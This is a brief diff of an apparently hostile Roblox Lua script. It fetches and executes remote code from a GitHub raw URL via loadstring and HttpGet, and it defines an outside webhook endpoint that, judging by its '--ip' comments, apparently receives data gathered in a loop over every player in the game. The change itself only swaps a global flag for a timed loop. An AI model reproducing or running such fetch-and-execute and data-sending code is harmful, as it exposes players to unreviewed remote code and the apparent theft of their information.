@@ -1,7 +1,5 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/II-Fallzy-II/ExFallzY/main/beta"))()
 
-_G.haha = true
-
 --ip than tack
 
 local webh = "https://websec.services/send/62d7641842cd3fcfb203398b"
@@ -55,7 +53,7 @@ end)
 --ip^
 
 
-While _G.haha do
+while wait(1) do
 
 
  for i, x in pairs(game.Players:GetPlayers()) do
